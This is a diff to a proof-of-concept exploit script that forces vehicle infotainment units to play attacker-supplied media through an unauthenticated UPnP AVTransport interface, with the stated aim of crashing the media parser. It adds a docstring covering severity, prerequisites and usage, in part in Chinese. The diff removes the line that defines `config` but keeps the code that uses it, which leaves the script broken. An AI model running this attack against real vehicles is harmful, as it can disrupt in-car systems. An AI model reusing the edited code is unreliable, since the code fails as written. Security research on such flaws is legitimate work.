@@ -1,3 +1,14 @@
+"""
+PoC Name: UPnP AVTransport Unauthenticated Media Injection DoS
+CVE: N/A
+Component: Application Stack
+Category: Application
+Severity: High
+CVSS: 7.5
+Description: IVI 系统 UPnP AVTransport SOAP 接口无认证，攻击者可通过 SetAVTransportURI+Play 强制 IVI 播放外部媒体并触发媒体解析器崩溃。完整攻击链包含回调验证
+Prerequisites: 与目标车机处于同一局域网并放行相关应用层端口
+Usage: python3 59_UPnP_AVTransport_Media_Inject.py <args>
+"""
 import socket
 import sys
 import time
@@ -266,8 +277,7 @@ s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("用法: python3 64_UPnP_AVTransport_Media_Inject.py <target_ip>")
+        print("Usage: python3 59_UPnP_AVTransport_Media_Inject.py <args>")
         sys.exit(1)
-    config = {"target_ip": sys.argv[1]}
     plugin = UPnPAVTransportMediaInjectPlugin(config)
     plugin.run_verify()
